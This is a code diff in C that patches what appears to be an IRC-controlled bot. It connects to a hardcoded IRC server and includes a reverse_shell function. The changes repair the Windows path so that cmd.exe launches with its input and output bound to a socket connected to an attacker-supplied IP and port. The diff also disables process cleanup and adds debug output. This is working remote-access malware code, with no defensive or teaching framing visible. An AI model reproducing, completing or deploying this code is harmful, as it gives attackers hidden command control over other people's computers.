@@ -4,6 +4,7 @@
 #include "logger.h"
 #ifdef _WIN32
 #include <io.h>
+#include <stdlib.h>
 #endif
 
 void create_socketfd(int* fd) {
@@ -53,13 +54,12 @@ void connect_socket(int* fd) {
 
     while (1) {
         sockin.sin_family = AF_INET;
-#ifdef _WIN32
         sockin.sin_port = htons(IRC_PORT);
+        // Copy ip address to sockein.sin_addr
+#ifdef _WIN32
         InetPton(AF_INET, _T(IRC_IP), &sockin.sin_addr.s_addr);
 #else
-        // TODO copy ip address to sockein.sin_addr
         sockin.sin_addr.s_addr = inet_addr(IRC_IP);
-        sockin.sin_port = htons(IRC_PORT);
 #endif
         // Connect to socket
         if (connect(*fd, (struct sockaddr *)&sockin, sizeof(sockin)) == SOCKET_ERROR) {
@@ -160,29 +160,29 @@ int read_packet(int *fd, char *buffer) {
 #ifdef _WIN32
 void reverse_shell(CHAR *ip, int port) {
     WSADATA wsaData;
+    SOCKET shell_fd;
 #else
 void reverse_shell(char *ip, int port) {
-#endif
     int shell_fd;
+#endif
     struct sockaddr_in sockin;
     sockin.sin_family = AF_INET;
 
 #ifdef _WIN32
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData)) {
-        shell_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    }
+    shell_fd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
 #endif
-
     sockin.sin_family = AF_INET;
     sockin.sin_port = htons(port);
 
 #ifdef _WIN32
-    InetPton(AF_INET, _T(IRC_IP), &sockin.sin_addr.s_addr);
+    wchar_t wIp[IP_MAX_SIZE];
+    size_t outSize;
+    mbstowcs_s(&outSize, wIp, ip, strlen(ip) + 1); //Plus null
+    LPWSTR ptr = wIp;
+    InetPton(AF_INET, ptr, &sockin.sin_addr.s_addr);
 #else
     sockin.sin_addr.s_addr = inet_addr(ip);
 #endif // _WIN32
-
-
     shell_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
     if (shell_fd == INVALID_SOCKET) {
@@ -190,23 +190,33 @@ void reverse_shell(char *ip, int port) {
     }
 
     if (connect(shell_fd, (struct sockaddr *)&sockin, sizeof(sockin)) == SOCKET_ERROR) {
+        printf("Could not connect\n");
         return;
     }
+
+#ifdef _WIN32
+    if (WSAGetLastError() != 0) {
+        printf("Could not connect WIN\n");
+        return;
+    }
+#endif
 #ifdef _WIN32
     wchar_t proc[8] = L"cmd.exe";
     STARTUPINFO str_in;
     PROCESS_INFORMATION proc_in;
+    log_message("It's all starting now\n");
     memset(&str_in, 0, sizeof(str_in));
     str_in.cb = sizeof(str_in);
     str_in.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
     str_in.hStdInput = str_in.hStdOutput = str_in.hStdError = (HANDLE)shell_fd; // foward all file descriptors to our shell file descriptor
 
-    _write(shell_fd, SHELL_MOTD, strlen(SHELL_MOTD));
+    // _write(shell_fd, SHELL_MOTD, strlen(SHELL_MOTD));
 
     CreateProcess(NULL, proc, NULL, NULL, TRUE, 0, NULL, NULL, &str_in, &proc_in); // create process cmd
-    WaitForSingleObject(proc_in.hProcess, INFINITE);
-    CloseHandle(proc_in.hProcess);
-    CloseHandle(proc_in.hThread);
+    // WaitForSingleObject(proc_in.hProcess, INFINITE);
+    // CloseHandle(proc_in.hProcess);
+    // CloseHandle(proc_in.hThread);
+    //_close(shell_fd);
 
 #else
     write(shell_fd, SHELL_MOTD, strlen(SHELL_MOTD));
